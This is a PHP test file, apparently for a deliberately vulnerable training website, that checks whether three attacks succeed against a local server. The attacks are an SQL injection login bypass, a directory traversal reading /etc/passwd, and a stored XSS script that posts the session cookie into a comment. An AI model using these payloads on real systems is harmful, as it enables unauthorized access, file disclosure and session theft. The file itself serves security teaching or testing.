<?php
class VulnerabilitiesTest extends PHPUnit_Framework_TestCase {

    /**
     * @var \RemoteWebDriver
     */
    protected $webDriver;

    public function setUp()
    {
        $capabilities = array(\WebDriverCapabilityType::BROWSER_NAME => 'phantomjs');
        $this->webDriver = RemoteWebDriver::create('http://localhost:4444/wd/hub', $capabilities);
    }

    protected $url = 'http://127.0.0.1:80/';

    public function testHomePage()
    {
        $this->webDriver->get($this->url);
        $this->assertContains('A Terrible Website', $this->webDriver->getTitle());
    }

    public function testAdminSQLInjectionLogin()
    {
        $this->webDriver->get($this->url . "?page=login.php");
        $usernameField = $this->webDriver->findElement(WebDriverBy::name('username'));
        $usernameField->sendKeys("admin' OR 2=1 OR 'a'='")->submit();
        $this->assertContains('Hi, <strong>admin</strong>', $this->webDriver->getPageSource());
    }

    public function testDirectoryTraversal()
    {
        $this->webDriver->get($this->url . "?page=../../etc/passwd");
        $this->assertContains('root', $this->webDriver->getPageSource());
    }

    public function testXSS()
    {
        // First, login as Admin.
        $this->testAdminSQLInjectionLogin();

        // Open the article and send the XSS Javascript script.
        $this->webDriver->get($this->url . "?page=read.php&article_id=1");
        $commentField = $this->webDriver->findElement(WebDriverBy::name('body'));
        $commentField->sendKeys("
              <script>$.post(\"?page=comment.php\", {\"article_id\": 1, \"body\": document.cookie});</script>
        ")->submit();

        // Check that the XSS worked (leaked SID cookie)
        $this->webDriver->get($this->url . "?page=read.php&article_id=1");
        $this->assertContains('PHPSESSID', $this->webDriver->getPageSource());

    }

}
